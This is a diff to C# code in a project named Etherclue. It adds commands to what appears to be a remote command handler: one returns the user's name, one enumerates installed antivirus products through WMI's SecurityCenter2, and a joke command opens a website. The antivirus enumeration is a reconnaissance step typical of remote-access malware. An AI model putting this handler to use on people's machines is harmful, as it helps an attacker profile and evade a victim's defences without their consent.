@@ -10,6 +10,7 @@ using System.Windows.Forms;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.Management;
 
 namespace Etherclue
 {
@@ -80,8 +81,27 @@ namespace Etherclue
                     p.Start();
                     break;
 
-                case "myfunction":
+                case "getname":
                     responses.Add(Environment.UserName);
+                    break;
+
+                case "scanners":
+                    using (var searcher = new ManagementObjectSearcher(@"\\" +
+                                        Environment.MachineName +
+                                        @"\root\SecurityCenter2",
+                                        "SELECT * FROM AntivirusProduct"))
+                    {
+                        var searcherInstance = searcher.Get();
+                        foreach (var instance in searcherInstance)
+                        {
+                            responses.Add(instance["displayName"].ToString());
+                        }
+                    }
+                    break;
+
+                case "nyancat":
+                    Process.Start("http://www.nyan.cat/");
+                    responses.Add("Nya nya nya nya nya nya.");
                     break;
 
                     //case "":
